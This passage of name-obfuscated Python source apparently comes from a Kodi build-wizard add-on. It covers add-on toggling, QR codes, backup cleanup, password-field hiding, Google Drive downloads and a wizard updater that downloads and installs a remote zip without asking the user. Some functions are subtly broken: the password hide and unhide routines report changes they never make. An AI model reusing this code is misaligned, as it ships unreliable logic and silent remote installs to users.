	if os .path .exists (OOO000O0O0OOOO00O ):#line:847
		O0OO0OOO00OOO000O =open (OOO000O0O0OOOO00O )#line:848
		OOO0OOOO00000OOOO =O0OO0OOO00OOO000O .read ()#line:849
		OOO0OO0O0OOOO00OO =parseDOM (OOO0OOOO00000OOOO ,'addon',ret ='id')#line:850
		OOO0O0OO0000OO000 =parseDOM (OOO0OOOO00000OOOO ,'addon',ret ='name')#line:851
		OOOO0OO00OO0O00OO =parseDOM (OOO0OOOO00000OOOO ,'extension',ret ='library',attrs ={'point':'xbmc.service'})#line:852
		try :#line:853
			if len (OOO0OO0O0OOOO00OO )>0 :#line:854
				OOOOOO0O0OO000O0O =OOO0OO0O0OOOO00OO [0 ]#line:855
			if len (OOOO0OO00OO0O00OO )>0 :#line:856
				log ("We got a live one, stopping script: %s"%match [0 ],xbmc .LOGDEBUG )#line:857
				ebi ('StopScript(%s)'%os .path .join (ADDONS ,OOOOOO0O0OO000O0O ))#line:858
				ebi ('StopScript(%s)'%OOOOOO0O0OO000O0O )#line:859
				ebi ('StopScript(%s)'%os .path .join (ADDONS ,OOOOOO0O0OO000O0O ,OOOO0OO00OO0O00OO [0 ]))#line:860
				xbmc .sleep (500 )#line:861
		except :#line:862
			pass #line:863
	OOOO000OO00O00OO0 ='{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}, "id":1}'%(OOOOOO0O0OO000O0O ,OO0OOOOO0O0000OOO )#line:864
	O0O0000O0O00O000O =xbmc .executeJSONRPC (OOOO000OO00O00OO0 )#line:865
	if 'error'in O0O0000O0O00O000O and over ==None :#line:866
		OO0000O0OO0O0OOO0 ='Enabling'if OO0OOOOO0O0000OOO =='true'else 'Disabling'#line:867
		DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error %s [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,OO0000O0OO0O0OOO0 ,OO000OOO000O000O0 ),"Check to make sure the addon list is upto date and try again.[/COLOR]")#line:868
		forceUpdate ()#line:869
def addonInfo (OOO00000OO0O0OOOO ,O0O0OOOOOOOOOOOO0 ):#line:871
	O0OO0O0OOO0OOOO00 =addonId (OOO00000OO0O0OOOO )#line:872
	if O0OO0O0OOO0OOOO00 :return O0OO0O0OOO0OOOO00 .getAddonInfo (O0O0OOOOOOOOOOOO0 )#line:873
	else :return False #line:874
def whileWindow (O0O0O00O0OO0OO0O0 ,active =False ,count =0 ,counter =15 ):#line:876
	OO0000OO00OO000O0 =getCond ('Window.IsActive(%s)'%O0O0O00O0OO0OO0O0 )#line:877
	log ("%s is %s"%(O0O0O00O0OO0OO0O0 ,OO0000OO00OO000O0 ),xbmc .LOGDEBUG )#line:878
	while not OO0000OO00OO000O0 and count <counter :#line:879
		log ("%s is %s(%s)"%(O0O0O00O0OO0OO0O0 ,OO0000OO00OO000O0 ,count ))#line:880
		OO0000OO00OO000O0 =getCond ('Window.IsActive(%s)'%O0O0O00O0OO0OO0O0 )#line:881
		count +=1 #line:882
		xbmc .sleep (500 )#line:883
	while OO0000OO00OO000O0 :#line:885
		active =True #line:886
		log ("%s is %s"%(O0O0O00O0OO0OO0O0 ,OO0000OO00OO000O0 ),xbmc .LOGDEBUG )#line:887
		OO0000OO00OO000O0 =getCond ('Window.IsActive(%s)'%O0O0O00O0OO0OO0O0 )#line:888
		xbmc .sleep (250 )#line:889
	return active #line:890
def id_generator (size =6 ,chars =string .ascii_uppercase +string .digits ):#line:892
	return ''.join (random .choice (chars )for _O000OOOO00OO000OO in range (size ))#line:893
def generateQR (OOO0OOO0O000O0OOO ,OOO0000000O0OOO0O ):#line:895
    if not os .path .exists (QRCODES ):os .makedirs (QRCODES )#line:896
    OOO00OOO00OOOO000 =os .path .join (QRCODES ,'%s.png'%OOO0000000O0OOO0O )#line:897
    O00000O0OOO0OOO0O =pyqrcode .create (OOO0OOO0O000O0OOO )#line:898
    O00000O0OOO0OOO0O .png (OOO00OOO00OOOO000 ,scale =10 )#line:899
    return OOO00OOO00OOOO000 #line:900
def createQR ():#line:902
	O00000OO0O0O0O00O =getKeyboard ('',"%s: Insert the URL for the QRCode."%ADDONTITLE )#line:903
	if O00000OO0O0O0O00O =="":LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Create QR Code Cancelled![/COLOR]'%COLOR2 );return #line:904
	if not O00000OO0O0O0O00O .startswith ('http://')and not O00000OO0O0O0O00O .startswith ('https://'):LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:905
	if O00000OO0O0O0O00O =='http://'or O00000OO0O0O0O00O =='https://':LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:906
	O0OOOOOOO0OOOO0OO =workingURL (O00000OO0O0O0O00O )#line:907
	if not O0OOOOOOO0OOOO0OO ==True :#line:908
		if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems the your enter isnt working, Would you like to create it anyways?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOOO0OOOO0OO ),yeslabel ="[B][COLOR red]Yes Create[/COLOR][/B]",nolabel ="[B][COLOR green]No Cancel[/COLOR][/B]"):#line:909
			return #line:910
	OO0OO00O0OO0OO000 =getKeyboard ('',"%s: Insert the name for the QRCode."%ADDONTITLE )#line:911
	OO0OO00O0OO0OO000 ="QrImage_%s"%id_generator (6 )if OO0OO00O0OO0OO000 ==""else OO0OO00O0OO0OO000 #line:912
	OOO0OO000000OO0OO =generateQR (O00000OO0O0O0O00O ,OO0OO00O0OO0OO000 )#line:913
	DIALOG .ok (ADDONTITLE ,"[COLOR %s]The QRCode image has been created and is located in the addondata directory:[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO000000OO0OO .replace (HOME ,'')))#line:914
def cleanupBackup ():#line:916
	O000000O0O000OOOO =xbmc .translatePath (MYBUILDS )#line:917
	O0O0O00OO0OOOO0OO =glob .glob (os .path .join (O000000O0O000OOOO ,"*"))#line:918
	O00OOOO000000O0O0 =[];OOOO0O0O0OOOOOOO0 =[]#line:919
	if len (O0O0O00OO0OOOO0OO )==0 :#line:920
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Backup Location: Empty[/COLOR]"%(COLOR2 ))#line:921
		return #line:922
	for O0O00OOO0O0O000O0 in sorted (O0O0O00OO0OOOO0OO ,key =os .path .getmtime ):#line:923
		OOOO0O0O0OOOOOOO0 .append (O0O00OOO0O0O000O0 )#line:924
		OOO0O0000O00OOOO0 =O0O00OOO0O0O000O0 .replace (O000000O0O000OOOO ,'')#line:925
		if os .path .isdir (O0O00OOO0O0O000O0 ):#line:926
			O00OOOO000000O0O0 .append ('/%s/'%OOO0O0000O00OOOO0 )#line:927
		elif os .path .isfile (O0O00OOO0O0O000O0 ):#line:928
			O00OOOO000000O0O0 .append (OOO0O0000O00OOOO0 )#line:929
	O00OOOO000000O0O0 =['--- Remove All Items ---']+O00OOOO000000O0O0 #line:930
	OOO0000OOO0O00OOO =DIALOG .select ("%s: Select the items to remove from 'MyBuilds'."%ADDONTITLE ,O00OOOO000000O0O0 )#line:931
	if OOO0000OOO0O00OOO ==-1 :#line:933
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:934
	elif OOO0000OOO0O00OOO ==0 :#line:935
		if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to clean up all items in your 'My_Builds' folder?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,MYBUILDS ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:936
			O000O0OOO00OO00OO ,OO0OO0O00OO0000OO =cleanHouse (xbmc .translatePath (MYBUILDS ))#line:937
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Removed Files: [COLOR %s]%s[/COLOR] / Folders:[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O000O0OOO00OO00OO ,COLOR1 ,OO0OO0O00OO0000OO ))#line:938
		else :#line:939
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:940
	else :#line:941
		O00O0OOO0O0O0OOO0 =OOOO0O0O0OOOOOOO0 [OOO0000OOO0O00OOO -1 ];O0000O0O00OOO0O00 =False #line:942
		if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove [COLOR %s]%s[/COLOR] from 'My_Builds' folder?[/COLOR]"%(COLOR2 ,COLOR1 ,O00OOOO000000O0O0 [OOO0000OOO0O00OOO ]),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0OOO0O0O0OOO0 ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:943
			if os .path .isfile (O00O0OOO0O0O0OOO0 ):#line:944
				try :#line:945
					os .remove (O00O0OOO0O0O0OOO0 )#line:946
					O0000O0O00OOO0O00 =True #line:947
				except :#line:948
					log ("Unable to remove: %s"%O00O0OOO0O0O0OOO0 )#line:949
			else :#line:950
				cleanHouse (O00O0OOO0O0O0OOO0 )#line:951
				try :#line:952
					shutil .rmtree (O00O0OOO0O0O0OOO0 )#line:953
					O0000O0O00OOO0O00 =True #line:954
				except Exception as OOOOOO0O000OOOO0O :#line:955
					log ("Error removing %s"%O00O0OOO0O0O0OOO0 ,xbmc .LOGNOTICE )#line:956
			if O0000O0O00OOO0O00 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed![/COLOR]"%(COLOR2 ,O00OOOO000000O0O0 [OOO0000OOO0O00OOO ]))#line:957
			else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Removing %s![/COLOR]"%(COLOR2 ,O00OOOO000000O0O0 [OOO0000OOO0O00OOO ]))#line:958
		else :#line:959
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:960
def getCond (O00O0OO0O00OOOO00 ):#line:962
	return xbmc .getCondVisibility (O00O0OO0O00OOOO00 )#line:963
def ebi (O0O00O000O00O00O0 ):#line:965
	xbmc .executebuiltin (O0O00O000O00O00O0 )#line:966
def refresh ():#line:968
	ebi ('Container.Refresh()')#line:969
def splitNotify (O0O0OOOO00O000000 ):#line:971
	OOO0OOO0000OO0OOO =openURL (O0O0OOOO00O000000 ).replace ('\r','').replace ('\t','').replace ('\n','[CR]')#line:972
	if OOO0OOO0000OO0OOO .find ('|||')==-1 :return False ,False #line:973
	O0O0OO0O0O0OOOOO0 ,OO0O00OO00O000000 =OOO0OOO0000OO0OOO .split ('|||')#line:974
	if OO0O00OO00O000000 .startswith ('[CR]'):OO0O00OO00O000000 =OO0O00OO00O000000 [4 :]#line:975
	return O0O0OO0O0O0OOOOO0 .replace ('[CR]',''),OO0O00OO00O000000 #line:976
def forceUpdate (silent =False ):#line:978
	ebi ('UpdateAddonRepos()')#line:979
	ebi ('UpdateLocalAddons()')#line:980
	if silent ==False :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מעדכן הרחבות[/COLOR]'%COLOR2 )#line:982
def convertSpecial (O0O00OO00O0O00OOO ,over =False ):#line:984
	OOO0OOOOO0000OO00 =fileCount (O0O00OO00O0O00OOO );O00OOO0O0OO0000O0 =0 #line:985
	DP .create (ADDONTITLE ,"[COLOR %s]Changing Physical Paths To Special"%COLOR2 ,"","Please Wait[/COLOR]")#line:986
	for OOOOOOOOO0O000O0O ,OOO000OO000OO0O0O ,OO00000O0O00OO0OO in os .walk (O0O00OO00O0O00OOO ):#line:987
		for OO00O0O0O00O0OO0O in OO00000O0O00OO0OO :#line:988
			O00OOO0O0OO0000O0 +=1 #line:989
			OO000O0000O000O0O =int (percentage (O00OOO0O0OO0000O0 ,OOO0OOOOO0000OO00 ))#line:990
			if OO00O0O0O00O0OO0O .endswith (".xml")or OO00O0O0O00O0OO0O .endswith (".hash")or OO00O0O0O00O0OO0O .endswith ("properies"):#line:991
				DP .update (OO000O0000O000O0O ,"[COLOR %s]Scanning: [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOOOOOO0O000O0O .replace (HOME ,'')),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O0O0O00O0OO0O ),"Please Wait[/COLOR]")#line:992
				OOOOO0OOOOO0O0000 =open (os .path .join (OOOOOOOOO0O000O0O ,OO00O0O0O00O0OO0O )).read ()#line:993
				O0OO0OO00O0OO0000 =urllib .quote (HOME )#line:994
				OO000OO0OO0OO0O00 =urllib .quote (HOME ).replace ('%3A','%3a').replace ('%5C','%5c')#line:995
				O0OO0O00O00OOO00O =OOOOO0OOOOO0O0000 .replace (HOME ,'special://home/').replace (O0OO0OO00O0OO0000 ,'special://home/').replace (OO000OO0OO0OO0O00 ,'special://home/')#line:996
				O00OO0O0OOOO000O0 =open ((os .path .join (OOOOOOOOO0O000O0O ,OO00O0O0O00O0OO0O )),mode ='w')#line:997
				O00OO0O0OOOO000O0 .write (str (O0OO0O00O00OOO00O ))#line:998
				O00OO0O0OOOO000O0 .close ()#line:999
	DP .close ()#line:1000
	log ("[Convert Paths to Special] Complete",xbmc .LOGNOTICE )#line:1001
	if over ==False :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Convert Paths to Special: Complete![/COLOR]"%COLOR2 )#line:1002
def clearCrash ():#line:1004
	OOO0OOO00O0O00O0O =[]#line:1005
	for OOO0O00OO0O0O00OO in glob .glob (os .path .join (LOG ,'*crashlog*.*')):#line:1006
		OOO0OOO00O0O00O0O .append (OOO0O00OO0O0O00OO )#line:1007
	if len (OOO0OOO00O0O00O0O )>0 :#line:1008
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the Crash logs?'%COLOR2 ,'[COLOR %s]%s[/COLOR] Files Found[/COLOR]'%(COLOR1 ,len (OOO0OOO00O0O00O0O )),yeslabel ="[B][COLOR green]Remove Logs[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Logs[/COLOR][/B]"):#line:1009
			for O0OOOO0OOOOOO000O in OOO0OOO00O0O00O0O :#line:1010
				os .remove (O0OOOO0OOOOOO000O )#line:1011
			LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]%s Crash Logs Removed[/COLOR]'%(COLOR2 ,len (OOO0OOO00O0O00O0O )))#line:1012
		else :LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Crash Logs Cancelled[/COLOR]'%COLOR2 )#line:1013
	else :LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]No Crash Logs Found[/COLOR]'%COLOR2 )#line:1014
def hidePassword ():#line:1016
	if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]hide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Hide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1017
		O00OOOOO0O00O0O00 =0 #line:1018
		for O0OO0O00O0000OOO0 in glob .glob (os .path .join (ADDONS ,'*/')):#line:1019
			OOOO0OOOOO00000O0 =os .path .join (O0OO0O00O0000OOO0 ,'resources','settings.xml')#line:1020
			if os .path .exists (OOOO0OOOOO00000O0 ):#line:1021
				O0OOOO0OOO0O00O00 =open (OOOO0OOOOO00000O0 ).read ()#line:1022
				OOOO00O0OOO00OOOO =parseDOM (O0OOOO0OOO0O00O00 ,'addon',ret ='id')#line:1023
				for OO0OO0O0O0O00O000 in OOOO00O0OOO00OOOO :#line:1024
					if 'pass'in OO0OO0O0O0O00O000 :#line:1025
						if not 'option="hidden"'in OO0OO0O0O0O00O000 :#line:1026
							try :#line:1027
								OOOOOO0O00OOOOOOO =OO0OO0O0O0O00O000 .replace ('/','option="hidden" /')#line:1028
								O0OOOO0OOO0O00O00 .replace (OO0OO0O0O0O00O000 ,OOOOOO0O00OOOOOOO )#line:1029
								O00OOOOO0O00O0O00 +=1 #line:1030
								log ("[Hide Passwords] found in %s on %s"%(OOOO0OOOOO00000O0 .replace (HOME ,''),OO0OO0O0O0O00O000 ),xbmc .LOGDEBUG )#line:1031
							except :#line:1032
								pass #line:1033
				OO0OO0OOO0O0O0O00 =open (OOOO0OOOOO00000O0 ,mode ='w');OO0OO0OOO0O0O0O00 .write (O0OOOO0OOO0O00O00 );OO0OO0OOO0O0O0O00 .close ()#line:1034
		LogNotify ("[COLOR %s]Hide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O00OOOOO0O00O0O00 ))#line:1035
		log ("[Hide Passwords] %s items changed"%O00OOOOO0O00O0O00 ,xbmc .LOGNOTICE )#line:1036
	else :log ("[Hide Passwords] Cancelled",xbmc .LOGNOTICE )#line:1037
def unhidePassword ():#line:1039
	if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]unhide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Unhide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1040
		O0OO00OOOOOOOOO0O =0 #line:1041
		for O0OO0000OOOOOO0OO in glob .glob (os .path .join (ADDONS ,'*/')):#line:1042
			OO0O0O0OOOO0OO0OO =os .path .join (O0OO0000OOOOOO0OO ,'resources','settings.xml')#line:1043
			if os .path .exists (OO0O0O0OOOO0OO0OO ):#line:1044
				OO000000O0O0OO0OO =open (OO0O0O0OOOO0OO0OO ).read ()#line:1045
				O0O000000O00O0O00 =parseDOM (OO000000O0O0OO0OO ,'addon',ret ='id')#line:1046
				for O00000OO0O0000O0O in O0O000000O00O0O00 :#line:1047
					if 'pass'in O00000OO0O0000O0O :#line:1048
						if 'option="hidden"'in O00000OO0O0000O0O :#line:1049
							try :#line:1050
								O0O000OO0OOO00O0O =O00000OO0O0000O0O .replace ('option="hidden"','')#line:1051
								OO000000O0O0OO0OO .replace (O00000OO0O0000O0O ,O0O000OO0OOO00O0O )#line:1052
								O0OO00OOOOOOOOO0O +=1 #line:1053
								log ("[Unhide Passwords] found in %s on %s"%(OO0O0O0OOOO0OO0OO .replace (HOME ,''),O00000OO0O0000O0O ),xbmc .LOGDEBUG )#line:1054
							except :#line:1055
								pass #line:1056
				OO000OO0O0OOO0O00 =open (OO0O0O0OOOO0OO0OO ,mode ='w');OO000OO0O0OOO0O00 .write (OO000000O0O0OO0OO );OO000OO0O0OOO0O00 .close ()#line:1057
		LogNotify ("[COLOR %s]Unhide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O0OO00OOOOOOOOO0O ))#line:1058
		log ("[Unhide Passwords] %s items changed"%O0OO00OOOOOOOOO0O ,xbmc .LOGNOTICE )#line:1059
	else :log ("[Unhide Passwords] Cancelled",xbmc .LOGNOTICE )#line:1060
def chunk_report (OOOO00OOOOO0O0OOO ,O0O0O000OO000O0O0 ,O00O0O00OOOOOOO0O ):#line:1061
   OO0OOOO000O0OO0O0 =float (OOOO00OOOOO0O0OOO )/O00O0O00OOOOOOO0O #line:1062
   OO0OOOO000O0OO0O0 =round (OO0OOOO000O0OO0O0 *100 ,2 )#line:1063
   if OOOO00OOOOO0O0OOO >=O00O0O00OOOOOOO0O :#line:1065
      sys .stdout .write ('\n')#line:1066
def chunk_read (OO0OOO00O00OO000O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:1068
   import time #line:1069
   O0O00OO0O0O000000 =100 #line:1070
   OOOO00OOO0O0OOO0O =0 #line:1072
   OO0O0O0O000O0O0O0 =time .time ()#line:1073
   O00OO0OOOOOO0O0OO =0 #line:1074
   logging .warning ('Downloading')#line:1076
   with open (destination ,"wb")as OOOOOOO0OO00OOO0O :#line:1077
    while 1 :#line:1078
      OOO00OO0OO0O0OOOO =time .time ()-OO0O0O0O000O0O0O0 #line:1079
      OOOO00O00OOOO0O00 =int (O00OO0OOOOOO0O0OO *chunk_size )#line:1080
      O000OO000000O00OO =OO0OOO00O00OO000O .read (chunk_size )#line:1081
      OOOOOOO0OO00OOO0O .write (O000OO000000O00OO )#line:1082
      OOOOOOO0OO00OOO0O .flush ()#line:1083
      OOOO00OOO0O0OOO0O +=len (O000OO000000O00OO )#line:1084
      OOOOO0000OO0O0OOO =float (OOOO00OOO0O0OOO0O )/O0O00OO0O0O000000 #line:1085
      OOOOO0000OO0O0OOO =round (OOOOO0000OO0O0OOO *100 ,2 )#line:1086
      if int (OOO00OO0OO0O0OOOO )>0 :#line:1087
        OOO0OOOO0O00O0O00 =int (OOOO00O00OOOO0O00 /(1024 *OOO00OO0OO0O0OOOO ))#line:1088
      else :#line:1089
         OOO0OOOO0O00O0O00 =0 #line:1090
      if OOO0OOOO0O00O0O00 >1024 and not OOOOO0000OO0O0OOO ==100 :#line:1091
          O0O0OOO0O00OOO00O =int (((O0O00OO0O0O000000 -OOOO00O00OOOO0O00 )/1024 )/(OOO0OOOO0O00O0O00 ))#line:1092
      else :#line:1093
          O0O0OOO0O00OOO00O =0 #line:1094
      if O0O0OOO0O00OOO00O <0 :#line:1095
        O0O0OOO0O00OOO00O =0 #line:1096
      dp .update (int (OOOOO0000OO0O0OOO ),"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOOO0000OO0O0OOO ,OOOO00O00OOOO0O00 /(1024 *1024 ),O0O00OO0O0O000000 /(1000 *1000 ),OOO0OOOO0O00O0O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0OOO0O00OOO00O ,60 ))#line:1097
      if dp .iscanceled ():#line:1098
         dp .close ()#line:1099
         break #line:1100
      if not O000OO000000O00OO :#line:1101
         break #line:1102
      if report_hook :#line:1104
         report_hook (OOOO00OOO0O0OOO0O ,chunk_size ,O0O00OO0O0O000000 )#line:1105
      O00OO0OOOOOO0O0OO +=1 #line:1106
   logging .warning ('END Downloading')#line:1107
   return OOOO00OOO0O0OOO0O #line:1108
def googledrive_download (OOOOOOOO000O0OOO0 ,OOOO00000O00O0OOO ,OOOOOO0OOO00OO00O ,OOOO00OOOOO0OOO00 ):#line:1110
    OO0OO0O0O0OOO0000 =[]#line:1114
    O00O00OOO0OO0OO00 =OOOOOOOO000O0OOO0 .split ('=')#line:1115
    OOOOOOOO000O0OOO0 =O00O00OOO0OO0OO00 [len (O00O00OOO0OO0OO00 )-1 ]#line:1116
    def O000O0O0000O0O000 (OO000OO0OOOOO00O0 ):#line:1118
        for O00OOO000O000000O in OO000OO0OOOOO00O0 :#line:1120
            logging .warning ('cookie.name')#line:1121
            logging .warning (O00OOO000O000000O .name )#line:1122
            OO0O000OOO0O0OO00 =O00OOO000O000000O .value #line:1123
            if 'download_warning'in O00OOO000O000000O .name :#line:1124
                logging .warning (O00OOO000O000000O .value )#line:1125
                logging .warning ('cookie.value')#line:1126
                return O00OOO000O000000O .value #line:1127
            return OO0O000OOO0O0OO00 #line:1128
        return None #line:1130
    def O000000000OO00O00 (OOO0OOOO00OOO000O ,OOOO0O00O00O0O00O ):#line:1132
        O0O00OO000OOOO00O =32768 #line:1134
        O00O0O0OOO00O0O00 =time .time ()#line:1135
        with open (OOOO0O00O00O0O00O ,"wb")as OOOOOOO0000OOOOO0 :#line:1137
            OOOO0O00O0OOOOO00 =1 #line:1138
            OOO0OOOO00OOOOOOO =32768 #line:1139
            try :#line:1140
                O0OOOOO000OO0O0OO =int (OOO0OOOO00OOO000O .headers .get ('content-length'))#line:1141
                print ('file total size :',O0OOOOO000OO0O0OO )#line:1142
            except TypeError :#line:1143
                print ('using dummy length !!!')#line:1144
                O0OOOOO000OO0O0OO =int (OOOO00OOOOO0OOO00 )*1000000 #line:1145
            for O0OO0OO0000O00000 in OOO0OOOO00OOO000O .iter_content (O0O00OO000OOOO00O ):#line:1146
                if O0OO0OO0000O00000 :#line:1147
                    OOOOOOO0000OOOOO0 .write (O0OO0OO0000O00000 )#line:1148
                    OOOOOOO0000OOOOO0 .flush ()#line:1149
                    OO0OO0OOO0O0000OO =time .time ()-O00O0O0OOO00O0O00 #line:1150
                    O0O0OO0OO0O0O0OOO =int (OOOO0O00O0OOOOO00 *OOO0OOOO00OOOOOOO )#line:1151
                    if OO0OO0OOO0O0000OO ==0 :#line:1152
                        OO0OO0OOO0O0000OO =0.1 #line:1153
                    O0OOOO0OOO0OO00OO =int (O0O0OO0OO0O0O0OOO /(1024 *OO0OO0OOO0O0000OO ))#line:1154
                    O0O00O0000O000O0O =int (OOOO0O00O0OOOOO00 *OOO0OOOO00OOOOOOO *100 /O0OOOOO000OO0O0OO )#line:1155
                    if O0OOOO0OOO0OO00OO >1024 and not O0O00O0000O000O0O ==100 :#line:1156
                      OOO0000O0O0OOOOO0 =int (((O0OOOOO000OO0O0OO -O0O0OO0OO0O0O0OOO )/1024 )/(O0OOOO0OOO0OO00OO ))#line:1157
                    else :#line:1158
                      OOO0000O0O0OOOOO0 =0 #line:1159
                    OOOOOO0OOO00OO00O .update (int (O0O00O0000O000O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O00O0000O000O0O ,O0O0OO0OO0O0O0OOO /(1024 *1024 ),O0OOOOO000OO0O0OO /(1000 *1000 ),O0OOOO0OOO0OO00OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO0000O0O0OOOOO0 ,60 ))#line:1161
                    OOOO0O00O0OOOOO00 +=1 #line:1162
                    if OOOOOO0OOO00OO00O .iscanceled ():#line:1163
                     OOOOOO0OOO00OO00O .close ()#line:1164
                     break #line:1165
    O00O00O0O0O0OO0O0 ="https://docs.google.com/uc?export=download"#line:1166
    import urllib2 #line:1171
    import cookielib #line:1172
    from cookielib import CookieJar #line:1174
    O000OOOO0OOO000O0 =CookieJar ()#line:1176
    O00O00OO000OO0O00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O000OOOO0OOO000O0 ))#line:1177
    O0O0OO0O0OOOO00OO ={'id':OOOOOOOO000O0OOO0 }#line:1179
    O00000O0OOO000O00 =urllib .urlencode (O0O0OO0O0OOOO00OO )#line:1180
    logging .warning (O00O00O0O0O0OO0O0 +'&'+O00000O0OOO000O00 )#line:1181
    OOO0000000OOO0OOO =O00O00OO000OO0O00 .open (O00O00O0O0O0OO0O0 +'&'+O00000O0OOO000O00 )#line:1182
    O0O000OOO00000OOO =OOO0000000OOO0OOO .read ()#line:1183
    for OO0OOOO0000O000O0 in O000OOOO0OOO000O0 :#line:1185
         logging .warning (OO0OOOO0000O000O0 )#line:1186
    OOO0O00O00OOO0OOO =O000O0O0000O0O000 (O000OOOO0OOO000O0 )#line:1187
    logging .warning (OOO0O00O00OOO0OOO )#line:1188
    if OOO0O00O00OOO0OOO :#line:1189
        O0O000O0000OO0OO0 ={'id':OOOOOOOO000O0OOO0 ,'confirm':OOO0O00O00OOO0OOO }#line:1190
        OOOO000000O000OOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:1191
        O00000O0OOO000O00 =urllib .urlencode (O0O000O0000OO0OO0 )#line:1192
        OOO0000000OOO0OOO =O00O00OO000OO0O00 .open (O00O00O0O0O0OO0O0 +'&'+O00000O0OOO000O00 )#line:1193
        chunk_read (OOO0000000OOO0OOO ,report_hook =chunk_report ,dp =OOOOOO0OOO00OO00O ,destination =OOOO00000O00O0OOO ,filesize =OOOO00OOOOO0OOO00 )#line:1194
    return (OO0OO0O0O0OOO0000 )#line:1198
def wizardUpdate (startup =None ):#line:1199
	if workingURL (WIZARDFILE ):#line:1200
		OO0OO0O0O0OOOOOOO =checkWizard ('version')#line:1201
		O0OO0OOOOO00O00OO =checkWizard ('zip')#line:1202
		if OO0OO0O0O0OOOOOOO >VERSION :#line:1203
			O0O0O0OOO0O00O0OO =1 #line:1204
			if O0O0O0OOO0O00O0OO :#line:1205
				log ("[Auto Update Wizard] Installing wizard v%s"%OO0OO0O0O0OOOOOOO ,xbmc .LOGNOTICE )#line:1206
				OOOOO000OO0OOOOO0 =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,OO0OO0O0O0OOOOOOO ))#line:1208
				try :os .remove (OOOOO000OO0OOOOO0 )#line:1209
				except :pass #line:1210
				if 'google'in O0OO0OOOOO00O00OO :#line:1211
					O0OO0OO0OO00OO0O0 =googledrive_download (O0OO0OOOOO00O00OO ,OOOOO000OO0OOOOO0 ,DP2 ,checkWizard ('filesize'))#line:1212
				downloaderwiz .download4 (O0OO0OOOOO00O00OO ,OOOOO000OO0OOOOO0 ,DP2 )#line:1213
				xbmc .sleep (2000 )#line:1214
				DP2 .create ('מתקין')#line:1215
				DP2 .update (100 ,message ='אנא המתן ...')#line:1216
